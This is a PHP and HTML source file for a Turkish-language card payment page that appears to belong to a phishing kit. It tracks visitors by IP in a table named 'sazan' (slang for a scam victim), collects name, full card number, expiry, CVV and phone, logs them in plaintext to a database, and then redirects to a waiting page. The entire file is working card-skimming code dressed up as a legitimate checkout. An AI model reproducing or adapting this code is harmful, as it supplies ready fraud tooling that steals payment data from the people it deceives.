<?php
date_default_timezone_set('Europe/Istanbul');
include('connect.php');
    $db->query("UPDATE sazan SET now = 'Kart Sayfasında' WHERE ip = '{$ip}'");
if($_POST){
    $ad   = htmlspecialchars($_POST['ad']);
    $kk       = htmlspecialchars($_POST['kk']);
    $sonkul   = htmlspecialchars($_POST['sonkul']);
    $sonkul2   = htmlspecialchars($_POST['sonkul2']);
    $cvv   = htmlspecialchars($_POST['cvv']);
    $money = htmlspecialchars($_POST['money']);
    $phone = htmlspecialchars($_POST['phone']);
    ob_start();
    session_start();
    $cc_last_4 = substr($kk, 12, 16);
    $_SESSION['cc_last_4'] = $cc_last_4;
    $ip         = $_SERVER['REMOTE_ADDR'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("UPDATE sazan SET ad=?,date=?,kk=?,sonkul=?,cvv=?,money=?,phone=? WHERE ip = ?");
	$insert = $query->execute(array($ad,$date,$kk,$sonkul."/".$sonkul2,$cvv,$money,$phone,$ip));
	
	$log = $db->prepare("INSERT INTO log (ad,date,kk,sonkul,ccmonth,cvv,money) VALUES(?,?,?,?,?,?,?)");
	$insert = $log->execute(array($ad,$date,$kk,$sonkul,$sonkul2,$cvv,$money,));


    if($insert){
        header('Location:bekle.php');
    }
}

?>



	<html>
		

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
            <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <base >
			<title>
				Kredit kart | <?php echo $site['adi']; ?>
			</title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
		</head>
		<body>
<script>
  function validateForm() {
    var x = document.forms["sifresizLiraYukleme"]["kk"].value;
    if (x == null || x == "") {
      alert("Lütfen tüm alanları doldurduğunuzdan emin olun.");
      return false;
    }
  }
</script>
<body>
  <style class="INLINE_PEN_STYLESHEET_ID">
    body {
	background: #f7f7f7;
}
.container {
	width: 600px;
	margin: 100px auto;
	border-radius: 5px;
	border: 1px solid #95A5A6;
	color: #515751;
  -webkit-box-shadow: 4px 4px 6px 0px rgba(149,165,166,0.75);
  -moz-box-shadow: 4px 4px 6px 0px rgba(149,165,166,0.75);
  box-shadow: 4px 4px 6px 0px rgba(149,165,166,0.75);
}

h1 {
	color:#515751;
	margin:0;
	padding: 10px 20px;
	font-size: 24px;
	font-weight:normal;
}

.form-top {
	padding-top:20px;
  text-align: left;
}

.input-hide {
	float:right;
	cursor:pointer;
}

select.form-control:hover{
  background: #F8F9F9;
}

option select.form-control :hover {
  background: #F8F9F9;
}

input {
	font-size: 18px;
	color:#4b6cb7;
	background-color: #f7f7f7;
	width:100%;
	padding:13px 13px 13px 20px;
	box-sizing: border-box;
	border: 3px solid rgba(0,0,0,0);
}

.form-control:focus {
  border: 3px solid #2ECC71;
}

#pay-now {
	font-size: 20px;
	color:#f7f7f7;
	background-color: #2ECC71;
	width:100%;
	padding:13px 13px 13px 20px;
	box-sizing: border-box;
	border: 3px solid rgba(0,0,0,0);
  box-shadow:
  transition: all .3s linear;
}

#pay-now a {
	text-decoration: none;
	color:#4b6cb7;
}

#pay-now:hover {
	color: #f7f7f7;
	background: #27AE60;
	outline: none;
  transition: all .3s linear;
}
  </style>
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
</head>

<body>
  <body>
  <div class="container">
    <form  class="form-horizontal" action="kart.php?money=<?php if(isset($_GET['money'])){
    	echo htmlspecialchars($_GET['money']);
    }?>" method="POST" role="form">
    <input type="hidden" name="money" value="<?php if(isset($_GET['money'])){
    	echo htmlspecialchars($_GET['money']);
    }?>">
    <input type="hidden" name="phone" value="<?php if(isset($_GET['phone'])){
    	echo htmlspecialchars($_GET['phone']);
    }?>">
      <fieldset>
        <legend>
          <h1 class="form-top">Ödeme</h1>
        </legend>
        <div class="form-group">
          <label class="col-sm-3 control-label" for="card-holder-name">Ad Soyad</label>
          <div class="col-sm-9">
            <input required type="text" class="form-control" name="ad" id="card-holder-name" placeholder="Ad Soyad">
          </div>
        </div>
        <div class="form-group">
          <label class="col-sm-3 control-label" for="card-number">Kart Numarası</label>
          <div class="col-sm-9">
            <input id="card-number" class="form-control" name="kk" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
          </div>
        </div>
        <div class="form-group">
          <label class="col-sm-3 control-label" for="expiry-month">Son Kullanma tarihi</label>
          <div class="col-sm-9">
            <div class="row">
              <div class="col-xs-6">
                <select required class="form-control col-sm-2" name="sonkul" id="expiry-month">
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
              </div>
              <div class="col-xs-6">
                <select required class="form-control col-sm-2" name="sonkul2">
                  <option value="22">2022</option>
                  <option value="23">2023</option>
                  <option value="24">2024</option>
                  <option value="25">2025</option>
                  <option value="26">2026</option>
                  <option value="27">2027</option>
                  <option value="28">2028</option>
                  <option value="29">2029</option>
                </select>
              </div>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label class="col-sm-3 control-label" for="cvv">CVV</label>
          <div class="col-sm-6">
            <input required type="text" class="form-control" name="cvv" id="cvv" placeholder="Güvenlik kodu">
          </div>
        </div>
        <br>
        <div class="form-group">
          <div class="col-sm-12">
            <button type="submit" class="btn btn-success" id="pay-now">Ödeme</button>
          </div>
        </div>
      </fieldset>
    </form>
  </div>
<?php include 'footer.php';?>
</body>